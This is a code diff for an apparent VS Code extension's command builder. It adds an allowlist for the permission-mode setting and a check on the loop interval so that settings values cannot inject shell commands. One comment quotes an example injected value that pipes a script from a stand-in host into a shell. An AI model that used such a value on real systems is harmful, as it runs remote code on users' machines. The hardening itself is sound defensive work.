@@ -1,13 +1,38 @@
 // Pure loop-command builder. No vscode imports so it is unit-testable in Docker.
 import { Model } from './model';
 
+// Allowlist for `--permission-mode`, mirroring the `loopBoard.permissionMode` enum in package.json.
+// This value is spliced UNQUOTED into the loop terminal shell command (buildClaudeBase). package.json's
+// enum only constrains the Settings UI — a repo-supplied `.vscode/settings.json` can set it to any
+// string (e.g. `auto; curl evil.sh | sh`), which would execute when the user starts a loop. So the
+// value MUST be validated before it reaches the shell line; an off-list value falls back to 'auto'.
+export const PERMISSION_MODES = ['auto', 'acceptEdits', 'bypassPermissions', 'dontAsk', 'default', 'plan'];
+export function isValidPermissionMode(s: string): boolean {
+  return PERMISSION_MODES.indexOf(s) !== -1;
+}
+export function sanitizePermissionMode(s: string): string {
+  return isValidPermissionMode(s) ? s : 'auto';
+}
+
+// The loop interval rides into the `/loop <interval> …` bootstrap prompt (buildLoopCommand). Restrict
+// it to a plain <digits><unit> token so a settings-supplied value can't smuggle anything else onto the
+// line. Units s/m/h/d match the /loop skill; an invalid value falls back to '1m'.
+const LOOP_INTERVAL_RE = /^\d+[smhd]$/;
+export function isValidLoopInterval(s: string): boolean {
+  return LOOP_INTERVAL_RE.test(s);
+}
+export function sanitizeLoopInterval(s: string): string {
+  return isValidLoopInterval(s) ? s : '1m';
+}
+
 // Build the `claude …` invocation prefix (everything before the /loop prompt argv). The resolved
 // `--model` string is configurable and may contain shell glob metacharacters (`[` `]`, e.g.
 // `haiku[1m]`), so it MUST be single-quoted — otherwise zsh tries to glob-expand it and aborts with
 // "no matches found". The string is pre-validated (isValidModelString) to contain no single quote,
-// so a plain single-quote wrap is safe. permissionMode comes from a fixed enum, left unquoted.
+// so a plain single-quote wrap is safe. permissionMode is spliced unquoted, so it is sanitized to the
+// package.json enum here (invalid -> 'auto') — never trust a raw config value on the shell line.
 export function buildClaudeBase(permissionMode: string, modelString: string): string {
-  return `claude --permission-mode ${permissionMode} --model '${modelString}'`;
+  return `claude --permission-mode ${sanitizePermissionMode(permissionMode)} --model '${modelString}'`;
 }
 
 // Build the tiny bootstrap prompt pasted into a loop terminal: it only names the model and the
@@ -38,7 +63,7 @@ export function buildLoopCommand(loopText: string, model: Model, interval: strin
   if (!/```[^\n]*\n[\s\S]*?```/.test(section)) return undefined;
 
   return (
-    `/loop ${interval} You are running as model ${model}. Open .loopboard/LOOP.md, read the loop ` +
+    `/loop ${sanitizeLoopInterval(interval)} You are running as model ${model}. Open .loopboard/LOOP.md, read the loop ` +
     `worker instructions in its Automation section, and follow them exactly for this and every pass.`
   );
 }
